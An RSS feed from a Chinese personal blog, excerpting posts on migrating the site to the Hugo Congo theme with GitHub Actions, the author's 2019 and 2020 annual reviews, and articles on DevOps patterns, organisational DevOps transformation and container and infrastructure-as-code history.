<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on 顾宇的博客</title><link>https://wwww.guyu.me/posts/</link><description>Recent content in Posts on 顾宇的博客</description><generator>Hugo -- gohugo.io</generator><language>zh</language><lastBuildDate>Sat, 11 Dec 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://wwww.guyu.me/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>博客迁移到了新的 Hugo 主题 Congo（刚果）</title><link>https://wwww.guyu.me/posts/2021-12-11-migrate-to-new-theme-congo/</link><pubDate>Sat, 11 Dec 2021 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2021-12-11-migrate-to-new-theme-congo/</guid><description>所谓“写博客30分钟，找主题 6 小时”，这些天一直没更新博客的主要原因是一直在找寻一个简洁明快的博客主题，最终我找到了Congo，中文意义是是“刚果”。
于是我就花了半天时间把原来 Github Pages 上的博客迁移到了这个主题上，并采用了 Github Action 发布我的博客，以下是迁移步骤：
备份内容，并做一个全量删除提交 采用 Hugo 新建一个新的博客 安装 Congo 主题 采用 Github Actions 部署博客 覆盖配置，而不要修改 迁移旧的文章和图片 1. 备份内容，并做一个全量删除提交 # 一个博客的核心内容是图片和文章。这些内容在static目录和content目录下，把这些内容保存出来就好。
然后，通过 git rm -rf --ignore-unmatch *删除所有内容，并删除空的目录。
这时候创建一个删除提交，你就有之前删除内容的全量备份了。如果想恢复，只需要 git revert即可。
2. 采用 Hugo 新建一个新的博客 # 这时候你的目录是空的，你就可以执行hugo new site .重新建立一个站点了，这条命令默认会生成一个没有主题的空结构。
这个时候，你要提交一次，用于跟踪后续的主题和配置的修改。
3. 安装 Congo 主题 # 参考 https://jpanther.github.io/congo/docs/installation/ 的安装文档，里面有三种安装方式，分别是：
采用 Hugo （推荐） 采用 Git Submodule 下载静态文件 我采用了第三种方式下载了静态文件解压的方式来安装主题，简单粗暴，避免我想要更新时忘记一些配置，这样可以减少很多 git 或 hugo 的配置工作。
别忘了删除theme下面的exampleSite，节省一些空间。
这时候通过hugo server预览一下站点，看看主题是否正确加载，然后做一个提交。
4. 采用 Github Actions 部署博客 # 站点恢复的第一步是进行一次 push，并且发布站点。这时候我建议采用 Github Action 来自动化部署。
首先，参考Hugos 官方的 Github Pages 部署方式在代码库根目录创建.github/workflows/gh-pages.yml文件，内容如下： name: github pages on: push: branches: - main # Set a branch to deploy pull_request: jobs: deploy: runs-on: ubuntu-20.</description></item><item><title>2020年的总结</title><link>https://wwww.guyu.me/posts/2020-12-31-annual-review-for-2020/</link><pubDate>Thu, 31 Dec 2020 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2020-12-31-annual-review-for-2020/</guid><description>你看到的这篇文章，是今年的第一篇，同时也是今年的最后一篇。按照惯例，每年我都会写一篇总结。今年的总结会比往年的要长，就当我唠个长磕吧，把今年要写但没机会写出来的东西总结一下。
关于写作、分享和演讲 # 虽然今年没有写博客或者公众号，但今年确是我写作量最大的一年，将近 20 万字。是我往年平均数的两倍。顺利的话，2021年7月会和大家见面。至于是什么主题和内容，这里先卖个关子。
写作是一个很好的整理自己知识体系的过程。我在写作的时候，经常能发现某些知识掌握的不够扎实。于是研究过，讨论，实践。再把结果如实的写出来。写完之后，自己就对自己的知识体系有了更深的信心。
由于写作，耽误了和朋友家人相处的时间。在此还要谢谢夫人的支持和抱怨。
今年谢绝了一些公开的分享邀请。今年的主要的实践积累在于“规模化敏捷”（SAFe）和“领域驱动设计”（DDD）两个课题上。一部分已经写到了今年的项目中，另一部分计划更新到明年的公众号上。
明年的分享可能会采用微信视频号或者录播的方式。
其实最重要的，就是持续、稳定的输出和总结。这些都会是未来职业道路上积累的财富。今年做的不够好，明年继续。
关于阅读 # 今年读了很多不同方面的书，疫情期有了大段的时间和家人相处和读书。剩下就是利用午休、地铁、和乘飞机时间。
疫情期间读完了《禅与摩托车维修艺术》，这本书我曾经拿起三次，没超过10页又放下了。豆瓣的“特别版”读起来还是比较轻松。最重要的是理解作者自身的分裂和世界观的分裂而后统一的过程。这本书有三种读法，都会有不同的体验。
普通读法，就是从头按照夹叙夹议的方式读一遍。 游记读法，跳过哲学的部分。按照故事的方式读。 哲学读法，跳过游记的部分。按照论文的方式读。 此外，今年把买了三年的《三体》全部读完，确实一部比一部精彩。听说《三体》要拍电影和连续剧。我个人觉得从情节来说，第一部会比较好拍。选取一个人类的角度，对外星世界采用谈话和想象。构造出足够恐怖和威慑的感觉就可以。当然，辛苦画分镜头的画师了。而第二部第三部的细节描写较多。影视化会比较困难,每十年可以重新拍一次。很多经典的小说都重拍了很多次了。每一个导演和演员对剧本和故事都有不同的诠释。所以，我并不担心拍坏。新版总会比老版强，能够驾驭住故事本身和读者期望的导演，也需要几年甚至十几年的努力才做得到。
文学类的书还读了《岛上书店》和《在森崎书店的日子》，两本都是围绕一个书店展开的故事，同样也都是外文引进的翻译作品。从文学角度来讲，《岛上书店》的文字更加克制，情节安排更加引人入胜。同样，这两本书都分别改编成了电影，有机会的话可以比较着看一下。
去年在鼓浪屿上的书店买了《100个基本》和《新100个基本后》，就很喜欢松浦弥太郎这种简单且有智慧的表达（当然翻译的也很好）。所以今年也买了很多松浦弥太郎的书，大部分是在 Kindle 上看完的。包括：
《只要我能跑，没什么不能解决》 《不得不爱的两件事》 《今天也要用心过生活》 《崭新的理所当然》 《工作的100个基本》 技术方面，今年的主题是敏捷和DDD，都和工作相关。敏捷推荐BoB 大叔的《敏捷整洁之道》（我极其讨厌这个翻译）和《学习敏捷》。DDD 仍然推荐《实现领域驱动设计》，和《领域驱动设计》相比，文字更加顺畅。
社科类的书，今年读完了《未来简史》，《今日简史》读了一半。“人类简史三部曲”的恢弘叙事确实能够让人提升自己对世界的认识，开阔格局。我觉得，《未来简史》甚至影响了中国的政策制定。因为在《习近平谈治国理政 第三卷》里，你可以感觉到“人类命运共同体”这个宏大叙事和《未来简史》中所描述的理想是一致的。
对，我买了《习近平谈治国理政》，这仍然是我实践《原则》一书中所提到的原则：拥抱现实，应对现实。中国的现实是党的长期执政并引导社会各层面的全面发展。理解世界和所生活环境的社会大背景，就会得到长期而稳定的指导。能够在工作和投资中获得启示。
关于工作 # 当你阅读本文的时候，我应该正在办理离职手续。今年的最后一天，同样也是我在埃森哲工作的最后一天。
来埃森哲专注于技术咨询的两年，是一个认知和格局升级的过程。在埃森哲的两年中，接触到了更高级别的客户和更具备挑战的问题。在这个过程中，我收获了很多的咨询和实践经验。特别是今年，参与了两个客户的数字化转型。能够把我之前积累到的知识和技能统统用上，算是一件幸事。
然而，在埃森哲的咨询工作并不会给我一个固定类型的项目和时间用作积累。经常是哪里需要就前往哪里。这种不断更换项目内容和类型的工作方式有好也有坏。好的一面是能不断训练我让我对新环境的适应力会不断变强，但不好的一面就是容易变得浅薄，无论是知识积累还是客户关系。这对长期做咨询来说是不利的，毕竟客户需要的是你的专业服务，而专业是需要时间积累的。
很多时候人都会陷入对未来的迷茫中，如果想知道未来要往哪里去，最好还是要看你过去从哪里来。
我总结了一下我过去几年的工作经历，找到了以下五个关键词：
咨询 敏捷和DevOps 架构 云计算 数字化转型 咨询 # 总的来说，我还是很热爱咨询工作的。一方面可以拓宽眼界，另一方面，可以帮助他人解决问题。在咨询中对学习到的知识有更深刻的理解和更广泛的应用。和同事、客户的合作就形成了一种彼此滋养的关系。
中国的咨询行业缺乏体系化的职业培养和训练体系，这是由市场客观条件决定的。于是，我在自己做咨询和培养新晋咨询师的过程中总结了一系列原则和方法。一方面帮助自己在咨询项目中成功，另一方面用于帮助很多新晋咨询师。有些方式方法的反复实践印证了一些有效性，当然，咨询项目中还是会因为各种因素不同程度的“悲剧重演”。然而，这些原则和方法可以帮助我走出困境。明年也会将这些心得通过公众号分享出来。
敏捷和DevOps # 敏捷是一条持续精进且没有尽头的旅程，它是一种有效的生活方式和工作方式。今年我在一个客户上实施了 SAFe，也第一次让我完整了理解了规模化敏捷所要面对和解决的问题。想到之前和一群反对SAFe的人批评一起人云亦云，就觉得惭愧。现在理解到自己也曾经是没有实践过 SAFe的“嘴炮派”。
在体验了 SAFe 后，我报名参加了 SAFe 的认证咨询师（SPC）培训，并且通过了认证。同时我还通过了 SAFe 敏捷软件工程，SAFe 架构师和 SAFe DevOps 的认证以及培训师资格。学习的越深入，越发现 SAFe 这套体系的厉害之处。SAFe 解决了很多我在经历企业IT治理和数字化转型中所遇到的问题。
今年给不同的两家客户做了敏捷和 DevOps 转型相关的工作。我发现随着 DevOps 运动的持续深入，企业通过 DevOps 所需要的是一套完整的 IT 治理和研发管理体系。而“DevOps”虽然是当今数字化企业的必备，但新面临的各种问题却超出了 DevOps 的范围。
但是，我不赞成把 DevOps 泛化和扩大化。否则做 DevOps 就变成了无所不能的“假药”。
你可以简单理解 IT 行业就是“卖春药”和“卖假药”相互交替的过程。前者给你一个无限憧憬和期望，后者则是实践落地的一地鸡毛。“敏捷”，“DevOps”，“微服务”，“云原生”和数字化转型都被不同的IT巨头们当作春药和假药来卖。
这是“软技术”跟不上“硬技术”发展过程中的必然。但从制度经济学角度来看，这并不是什么新鲜事。制度转换的过程中有两个交易费用——寻找制度的费用和转变制度的费用，这两者只能在边际上区分开。我要补充的一点是，这两个费用可能是同时发生的。
在企业数字化的过程中一定会有自己的产品，也会需要构建自己的研发能力。这些能力采购不来，只能尽早开始积累。因为于管理的通用 IT 产品已经无法满足企业构建核心竞争力。因此，产品经理会是未来数字化企业的核心竞争力。所以，对于缺乏产品思维而只会一味“提升研发效能”的组织来说，是一个降维打击。
你可能会觉得“产品规划”属于“提升研发效能”的领域，我也认可这种想法。这里面涉及到一个“效能的边界”问题。但事实上我所碰到的客户（能代表大部分企业），因为组织结构和权限的关系。并没有把“产品规划”纳入“研发效能”的范畴。所以，这里还是尊重客户对“效能”边界的定义。
对于以上这些问题，SAFe 5.</description></item><item><title>2019年的总结</title><link>https://wwww.guyu.me/posts/2019-12-31-annual-review-for-2019/</link><pubDate>Tue, 31 Dec 2019 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2019-12-31-annual-review-for-2019/</guid><description>感谢您的关注和阅读。2018 年的总结拖延到了 2019 写，所以 2019 年的绝不拖延到 2020 年。和去年一样，我依然采用看板的方式管理自己的个人事务，年末的时候把自己完成的事情进行一下梳理，最后来看看今年都有哪些收获，这已经是第三年。以下是今年的总结，向您报告：
工作经历 # 今年一共交付了两个项目：一个项目是大型研发组织的的 DevOps 转型。另一个项目是一个全球人力资源相关的微服务应用架构。
今年交付的 DevOps 转型项目是我第一次碰到千人规模组织的 DevOps 的转型，这个项目从去年 11 月持续到了今年 6 月。因此有一些新的经验是以往的小型试点团队转型所不具备的。我把这个项目的经验写进了千人规模组织级 DevOps 演进的 9 个实践及技巧。这篇内容只是我整个经验中的一部分。此外，通过这个项目我对软件质量有了新的认识。
此外，我又意识到，当现在人们谈到 DevOps，更多是需要一套现代的完整组织、流程、工具和制度体系。我会在我接下来的项目里完善这个内容。
6 月开始，我进入了一个为期 3 个月的微服务应用架构项目。在这个项目里我掌握了一种新的微服务拆分方法，本质上是 DDD 的简化版。到现在为止，我掌握了几种不同的微服务拆解方法。这些方法没有好坏，好坏是在拆分之后应用、组织、流程上带来的改进效果。同一套方法可能得出同样的结论，但是可能出现不同的效果。这些效果之间的影响就是实施的细节。
对外分享 # 今年对外分享了 6 场，相比去年少了一半，但是大会规格有所上升，也结实到了很多新朋友。目的还是能够学习到行业里最新的知识。及时获得市场上的最新技术动向。
20191214-北京-中国软件技术大会-DevOps 的质量从用户故事开始 20191116-北京-Top100Summit-千人规模团队DevOps改进 20191026-北京-NCTS-DevOps的质量从需求质量开始 20190922-深圳-敏捷之旅-20190922-深圳-DevOps质量从用户故事开始 20190706-北京-DOIS-微服务产品团队规模化DevOps演进模式 20190623-深圳-DevOpsMeetup-千人规模DevOps组织演进模式 20190523-香港-CloudExpo-CloudNative DevOps 内容运营 # 我把自己的博客从 Hexo 转到了 Hugos，并且部署后到了腾讯云和Github 上。前者的域名是 www.wizardbyron.cn，后者的域名是 www.guyu.me。我自己做了两个脚本分别部署。
今年写了十三篇博客。基本上每个月会有一篇，仍然是以 DevOps 和微服务为主。今年是 DevOps 的十周年，同时也是技术雷达的十周年，写了三篇文章纪念技术发展（其实是去年写好的，今年为了跟着技术雷达发表进行了一些修改）：
从技术雷达看 DevOps 的十年——DevOps与持续交付 从技术雷达看 DevOps 的十年——基础设施即代码与云计算 从技术雷达看 DevOps 的十年——容器技术与微服务 “DevOps 转型实战”系列课程从 GitChat 上下架了，主要是内容有些陈旧，需要修改，原计划把这个课程再版后重新上架。然后因为在项目期间有了新的想法，就变成了“ DevOps 模式和反模式”。因此，我创建了一个”DevOps 模式”的知识星球，希望和大家讨论起来。但目前为止只更新了三篇，没有继续下去。主要还是有一件更重要的事情（后面会讲）。反思了一下，之前写的内容缺乏案例。之后和之前的案例会补充案例，方便大家在场景中应用。明年在完成了更重要的事情后会再更新。
几乎在同一时间，我创作了一个提升个人影响力的在线音频课程，是我第一次录制音频课程。效果不好，就不多宣传了。通过音频课程的录制，我有了几点体会:
读稿子会被听出来。 只通过语言的表达能力不如图。 人在只有音频内容的情况下听觉更加敏锐。 人正常语速 5 分钟大概是 1100 字左右，阅读的速度大概是 5 倍以上。 人耳的容错率要比眼睛低得多。 开源项目方面 # 我把以前的 Vivian 项目采用开源项目的工作流 Pipenv 进行了重写，并改名叫 [Rokit](Redirection Optimization Kit)，在这个过程中，我会把相关的内容总结成册，计划开源出来，以开源贡献开源。</description></item><item><title>千人规模组织级 DevOps 演进的 9 个实践及技巧</title><link>https://wwww.guyu.me/posts/2019-12-06-devops-tips-for-large-org/</link><pubDate>Fri, 06 Dec 2019 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2019-12-06-devops-tips-for-large-org/</guid><description>案例背景 # 在2018年年底，我参与了某一个大型产品团队的 DevOps 转型。这个产品的团队分为三个组织：产品业务部门（50多人），产品IT部门（250多人），以及产品的外包团队（800多人）。 经过产品化和微服务拆分后，组织开始以独立业务的方向划分。但是，由于之前的组织划分，团队并没有成为一个全功能的团队。而是采用原先的交付模式：业务部门提出需求，然后让IT部门开始设计解决方案，最后交给外包团队开发和测试。并且将测试团队和 计算平台团队变成各子产品的的公共资源，如下所示：
在这样的组织里，没交付一个产品需要 8 周的时间。按照原先的计划，2周完成需求分析，2周完成开发，2周完成产品的集成测试，2周完成用户验收测试，然后就进行发布，如下图所示：
然而，这个理想的计划并未得到实施。由于有些需求需要跨子产品，或者需求方案变更和延迟，导致需求延迟完成，使得接下来的环节相继延迟。然而，最核心的问题是版本计划不能根据变化调整，必须按照计划上线需求。因此，缺乏足够开发时间导致的不合格的软件半成品会堆到集成测试阶段。使得在用户验收测试阶段大量出现问题，“Bug”的数量爆发增长使得用户满意度大幅下降,如下图所示：
所以，用户希望通过 DevOps 能够弥合组织间的沟通间隙，将质量工作前移，减少Bug 数量并且缩短交付周期。在这个过程中，我总结了在50人以下的小型团队不会出现的关键问题以及对应的9个实践：
采用外部 DevOps 顾问 组织内部达成一致的 DevOps 理解和目标 采用改进而非转型减少转型风险和反弹 采用试点团队和推广团队 构建全功能团队并合并流程 提升需求质量 实践不同级别的 TDD 构建“比学赶超”的组织氛围 规范化管理实践并不断优化 聘用一个外部 DevOps 顾问 # 如果你是一个小型的团队，可以不用外部顾问。主要的原因是组织结构不复杂，很多事情只要团队能自主决策就能推动 DevOps 发展。
但如果你是一个大型组织，特别一个职能分工明确的组织向多个跨职能的全功能组织发展的时候，更多需要处理的是组织内部的复杂关系，重新切割和划分组织边界，组织内部就会出现矛盾。而 DevOps 顾问则是承接和转化矛盾的最理想人选。
那么，聘用一个外部 DevOps 顾问需要注意哪几点 # 首先，一个外部 DevOps 顾问需要至少两个以上企业或者客户的转型经验，特别是案例总结。因为不同企业在做 DevOps 的时候组织特点决定了不同的组织痛点和方法。做过多个企业的 DevOps 转型后，一个 DevOps 顾问就会明白这些区别。否则，就会把自己过去的经验“复制”过来，以为 DevOps 只有一种，从而拒绝学习组织现有的知识。那么就会盲目复制，导致转型效果和转型期望有很大差距。此外，“转型”是一门艺术，面对什么样的组织，采用什么样的话术和方法也是一门学问。这些细节也会影响 DevOps 转型的效果。
然后，DevOps 改进涉及到管理提升和技术提升两个方面。DevOps 顾问除了要具备精益，敏捷的管理实践。还要具备自动化测试、自动化运维、持续交付等技术能力。管理实践和技术实践两者都不可少，没有了管理实践，技术实践往往沦落为“工具赌博”，很多买来的工具都没有起到效果。没有了技术实践，管理实践也无法通过自动化取得进展。技术实践和管理实践相辅相成，技术实践是落地管理实践的手段和工具。只有二者紧密结合，才能发出最好的效果。
最后，DevOps 顾问一定要可以和团队在一起实践，而非在一边“指挥”。有一些 DevOps 教练没有动手实践过，只是“知道”，而非“做到”。这里面就会有很大的风险因素在里面，任何一个实践的落地和见效需要投入和时间。魔鬼都藏在细节里。如果没有做过，就难以避开转型上的“暗礁”
所以，在面试 DevOps 顾问的时候，要问 DevOps 顾问之前的转型案例，特别是的关注的点。而且不光要有管理实践，还有技术实践。在面试这些的内容的时候不光要讲方法论，还要讲采用什么工具如何落地。落地中间的困难点和关键点事什么。
为什么招聘一个 DevOps 专家转型效果不好 # 你可能会想，不如招聘一个 DevOps 专家来做。不是说不可以，而是说不要对这种方式做 DevOps 转型抱太高期望。因为他的工作也会受组织制度的制约。为了能够在组织生存下去，避免风险，他就会避免矛盾的发生。而这些矛盾的突破才是转型的关键。因此，聘用一个 DevOps 专家很难解决一些“顽疾”。
其次，很多专家会将自己的 DevOps 经验“复制”过来。然而，除了 DevOps 的实践本身以外。“转型”也是一系列技巧，如何获得信任，调整对方的预期，如何与对方沟通，在组织内应该说什么不应该说什么，以及怎么说怎么做都是技巧。没有做过“转型”的专家往往会忽略这些关键的细节。
在这个项目上工作了四个月之后，客户自己招聘了一个资深的应用架构专家。这个应用架构专家只有一家企业的 DevOps 经历，并没有“转型”经验。他申请来做 DevOps 转型。但他低估了 DevOps 转型在组织内部和各利益方的矛盾和挑战，导致自己在转型的过程中“腹背受敌”：如果不继续，自己工作的绩效受影响。如果继续做，又要面对同事之间的矛盾。
DevOps 顾问的另外一个工作就是要根据一套评估模型来对组织当前的状态进行评估，并给出改进建议。但无论什么样的成熟度模型，要兼顾到不同组织，所以大部分都是定性的条目。也就是说，职能给出“是”或“否”的结论，比如，发布周期是以“月”计算还是以“周”计算。但很难给出定量的结论，比如是三周好还是四周好。所以，如果你需要一些定量性的改进建议，就需要进一步定制化的进行度量。
建立 DevOps 共识 # DevOps 是一个抽象的概念，也缺乏一个定义。因此，每个人对 DevOps 的理解各不相同。DevOps 运动刚兴起的时候，每个人都会纠结“DevOps 是什么?</description></item><item><title>DevOps 模式 - 引入 DevOps 顾问</title><link>https://wwww.guyu.me/posts/2019-07-13-devops-pattern-introduce-devops-consultant/</link><pubDate>Sat, 13 Jul 2019 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2019-07-13-devops-pattern-introduce-devops-consultant/</guid><description>很多企业并不是 DevOps 运动的早期玩家。当开始注意到 DevOps 的时候，想快速达到 DevOps 实践领先企业的效果，会引入有经验的 DevOps 顾问进行快速的转型。
然而，短期的 DevOps 顾问合同如果不能帮助团队构建 DevOps 制度和 DevOps 文化，DevOps 转型的效果将随 DevOps 专家的离开而离开，使团队得到“DevOps 不适用”的错觉。因此，在引入 DevOps 专家顾问的时候，我们一定要明确 请 DevOps 顾问的目的以及 DevOps 顾问留下的东西。
模式：引入 DevOps 顾问 (Introduce DevOps Consultant) # 模式名称：引入 DevOps 顾问 (Introduce DevOps Consultant)
模式别名：引入 DevOps 专家，引入 DevOps 教练
模式类别： 策略模式
风险： 中 - 采用的时候要注意场景和条件，否则会出现反模式。
价值：中 - 采用该模式产生中期固定的收益，但要持续做才可以获得收益。
见效时间：快 - 2 周内可看到显著改进。
说明：
引入 DevOps 顾问需要注意以下几点： DevOps 顾问要对 DevOps 的历史和来龙去脉有起码的理解。 DevOps 顾问要有不同的转型案例，如果只有一类企业的 DevOps 转型案例，在转型的过程中很容易进入“路径依赖”，认为 DevOps 转型只有一种。所以，DevOps 顾问要问不同案例中的差异的区别。 DevOps 顾问要同时引入管理转型实践和技术实践。缺乏 DevOps 管理实践会导致 DevOps 转型失去方向和效果。缺乏 DevOps 技术实践会让 DevOps 难以落地。 把你的具体问题抛给 DevOps 顾问，让他提出问题和观点。 关注 DevOps 顾问在上述各种描述中对 CLAMS 原则的应用。 DevOps 顾问需要可以和团队“一起做”，而不是“在一边看”。 DevOps 顾问要能给出对于组织的 DevOps 评估，并且根据评估给出能够落地的解决方案。 DevOps 顾问要根据 DevOps 评估的内容，帮助组织构建出 DevOps 文化、技术实践，以及相应的制度。 警惕那些对组织特征、组织痛点和转型范围不提问题的 DevOps 顾问。 相关模式：DevOps 评估，DevOps 转型，DevOps 改进</description></item><item><title>从技术雷达看 DevOps 的十年——容器技术与微服务</title><link>https://wwww.guyu.me/posts/2019-07-21-devops-and-techradar-anniversary-docker-and-microservices/</link><pubDate>Thu, 11 Jul 2019 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2019-07-21-devops-and-techradar-anniversary-docker-and-microservices/</guid><description>本文原文发表于 2019 年 7 月 11 日的 ThoughtWorks 洞见，后经过修改发表到博客上。
在上一篇文章中，我们讲到了基础设施即代码和云计算给运维领域带来的深远影响。而 DevOps 运动不仅仅改变了运维端，同时也改变了开发端，特别是 Docker 的兴起和微服务架构的流行。在这一篇，我们将通过技术雷达上相关条目的变化来考察 Docker 和微服务的发展。
容器技术 # 在 Docker 技术出现之前，可以说是 DevOps 技术的 1.0 的时代，人们关注如何做好 CI/CD 和基础设施即代码。而 Docker 的出现迎来了 DevOps 2.0 时代，DevOps 所有的实践都围绕着 Docker 展开，以 Docker 为中心的技术架构影响了软件开发交付的方方面面。无论是开发还是运维都在讨论和使用 Docker。它们采用统一的交付格式和技术语言在讨论交付的过程，而不像之前开发只关注“打包前”，运维只关注“打包后”。
技术雷达关注 Linux 容器技术是在 Docker 出现之前，在 2012 年 4 月 的技术雷达上。“Linux 容器” 就出现在了技术雷达上的 “试验” 区域：
虚拟容器是一种对 SaaS 和 PaaS 实现特别有吸引力的虚拟化风格。OpenVZ 等 Linux 容器提供了虚拟机的隔离和管理优势, 而不需要通常与通用虚拟化相关的开销。在容器模型中, Guest 操作系统仅限于与 Host 主机操作系统相同, 但这对许多云应用程序来说并不是一个严重的限制。
一年之后，Docker 问世。两年之后，Docker 进入技术雷达。
容器技术 1.0：&amp;ldquo;轻量级的 Vagrant？&amp;rdquo; # 在 Docker 出现之前，DevOps 社区就广泛采用 Vagrant 测试 Chef 或者 Puppet 做基础设施即代码。所以，当我第一次看到 Docker 时，就感觉就是一个”轻量级的 Vagrant”。它们的思路几乎一致：
Vagrant 通过 Ruby 语法的 Vagrantfile 构建一个虚拟机。而 Docker 通过 Dockerfile 构建一个容器。 Vagrant 通过 package 命令构建一个可复制虚拟机的镜像。而 Docker 通过 build 构建一个镜像。 Vagrant 通过 upload 将虚拟机镜像上传至 box 分享站点。而 Docker 通过 push 将镜像上传至 image 分享站点。 此外，每一个 Vagrant 命令，你都可以找到一个对应的Docker 命令。</description></item><item><title>DevOps 模式 - 索引</title><link>https://wwww.guyu.me/posts/2019-06-03-devops-patterns-index/</link><pubDate>Sun, 02 Jun 2019 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2019-06-03-devops-patterns-index/</guid><description>我今天把 DevOps 模式和反模式做了一个简单的总结。如果全职写，半年可以写完。如果周更，需要两年，我怕自己烂尾，夜长梦多。
自己开的坑，含着泪也要把它填完。
DevOps 策略模式 # 模式：定义你的 DevOps 反模式：DevOps 教条主义 反模式：DevOps 复制者 模式：引入 DevOps 顾问 反模式：DevOps 专家依赖 模式：DevOps 评估 模式：DevOps 共识 反模式：片面的 DevOps 理解 模式：定义 DevOps 范围 模式：DevOps 三步工作法 模式：DevOps 团队复制 模式：DevOps 团队改进 模式：DevOps 规范 反模式：缺乏管理约束的 DevOps 规范 反模式：缺乏技术约束的 DevOps 规范 模式：测试计划驱动开发计划 案例-01：每个人自己的 DevOps 案例-02：不同范围下的 DevOps 策略 案例-03：DevOps 团队复制 vs DevOps 团队改进 DevOps 组织模式 # 模式：DevOps 试点团队 模式：DevOps 推广团队 模式：Dev 团队含 Ops 成员 模式：Dev 团队共享 Ops 团队 模式：BAU 团队和特性团队 反模式：职责过多的 DevOps 团队 反模式：全栈工程师 模式：独立的质量控制团队 反模式：屈服于交付压力的质量控制团队 案例-01：屈服于交付压力的质量控制团队 DevOps 管理模式 # 模式：最小可用流程 模式：DevOps 看板 模式：累计流图 模式：四类任务 模式：DevOps 关键指标 模式：定制化 DevOps 度量 反模式：没有度量的DevOps 模式：包含 Ops 的 Scrum 模式：质量内建 模式：质量保证和质量控制 反模式：过程质量 Over 结果质量 模式：DevOps 技能矩阵 模式：测试人员驱动开发人员 案例-01：结合质量控制的质量保证流程 案例-02：交付 QA 和流程 QA DevOps 文化模式 # 模式：DevOps 比学赶超 模式：CLAMS 反思 模式：DevOps 回顾会议 模式：DevOps 大使 模式：反向管理 反模式：DevOps 指挥官 模式：我要做 DevOps 反模式：要我做 DevOps 模式：全员为质量负责 模式：DevOps 培训 反模式：DevOps 速成班 模式：DevOps 分享 反模式：封闭的 DevOps 模式：&amp;ldquo;如何定义&amp;quot;和&amp;quot;如何度量&amp;quot;问题 案例-01：规模化 DevOps 案例-02：正向管理 vs 反向管理 案例-03：通过分享增强自己的 DevOps 能力 DevOps 技术模式 # 模式：持续集成 反模式：持续集成表演 模式：持续部署 模式：基础设施即代码 模式：基础设施流水线 模式：自动化安全扫描 模式：测试驱动开发 反模式：过度自动化的 DevOps 模式：DevOps 平台 反模式：工具化 DevOps 反模式：基于组织映射的 DevOps 平台 模式：DesignOps 模式：混沌工程 模式：环境无关的应用程序 模式：环境相关的应用程序 模式：自部署的应用程序 反模式：知识太多的应用程序 反模式：基础设施依赖的应用程序 模式：12 Factors App 模式：BeyondCorp 模式：3R 企业安全 模式：微服务架构 反模式：微服务嫉妒 反模式：缺乏 DevOps 能力的微服务组织 模式：度量驱动的微服务 反模式：缺乏度量的微服务 模式：Serverless 应用架构 反模式：纳服务架构 案例-01：基于 Serverless 的微服务架构 案例-02：数据库变更流水线 关于 DevOps 模式 # DevOps 模式的索引在 Github 上开源，地址是https://github.</description></item><item><title>DevOps 模式 - 定义你的DevOps</title><link>https://wwww.guyu.me/posts/2019-05-26-devops-pattern-define-your-devops/</link><pubDate>Sun, 26 May 2019 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2019-05-26-devops-pattern-define-your-devops/</guid><description>遗憾的是，很少有人真的关心 “DevOps 是什么”，当然其实也不重要。比 DevOps 是什么来说，更重要的是 “DevOps 能做什么”。据 John Willis 的说法，DevOps 运动的发起人 Patrick Debois 一直拒绝给 DevOps 下定义是一件了不起的事情。 Patrick Debois 他不希望把 DevOps 据为己有。DevOps 应该属于社区，属于每一个愿意投身于 DevOps 目标的个人和组织。
由于第一届 DevOpsDays 奠定 DevOps 的基础。组织者 Patrick Debois 作为第一个&amp;quot;官方&amp;quot; DevOps 发言人。第一届 DevOps 的产出内容给未来的 DevOps 发展方向上起到决定性作用。因此，DevOps 模式中的 DevOps 的相关定义均参考Patrick Debios 的博客。
然而，在我过去经历的不同的 DevOps 转型/改进项目中的经历来看。不同的组织，不同的部门，甚至是同一个部门的人，大家对 DevOps 的理解并不一致。这对 DevOps 长时间在组织内发挥改进作用是不利的。
模式：定义你的 DevOps (Define Your DevOps) # 模式名称：定义你的 DevOps (Define Your DevOps)
模式别名：定制化 DevOps 定义 (Customize DevOps Definition)
模式类别： 策略模式
风险： 中 - 采用的时候要注意场景和条件，否则会出现反模式。
价值：中 - 采用该模式产生中期固定的收益，但要持续做才可以获得收益。
见效时间：快 - 2 周内可看到显著改进。
说明：
根据组织的需要，在基于对 DevOps 历史和实践的理解上建立对组织发展有益的 DevOps 的定义。DevOps 的定义包括 DevOps 的组织改进范围，DevOps 的度量，DevOps 的实践。在采用 DevOps 实践的过程中，要先取得 DevOps 共识并基于共识采取 DevOps 度量。否则无法确定 DevOps 带来的改进。
此外，DevOps 的定义会随着组织在的不同阶段而变化。要定期重新定义当前阶段的DevOps 目标，否则会导致&amp;quot;DevOps教条主义&amp;quot; 反模式和&amp;quot; DevOps 复制者&amp;quot;反模式。</description></item><item><title>从技术雷达看 DevOps 的十年——基础设施即代码与云计算</title><link>https://wwww.guyu.me/posts/2019-05-21-devops-and-techradar-anniversary-infrastructure-as-code-and-cloud-computing/</link><pubDate>Tue, 21 May 2019 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2019-05-21-devops-and-techradar-anniversary-infrastructure-as-code-and-cloud-computing/</guid><description>本文原文发表于 2019 年 5 月 21 日的 ThoughtWorks 洞见，后经过修改发表到博客上。
在上一篇文章中，我们讲到了DevOps 和持续交付的关系。本篇将回顾最先改变运维工作的相关技术 —— 基础设施即代码和云计算，通过技术雷达上相关条目的变动来跟踪其趋势变化。
基础设施即代码 # 和持续交付一样，基础设施即代码（Infrastructure as code）这项技术第一次在技术雷达出现就被纳入到了“采纳”环。
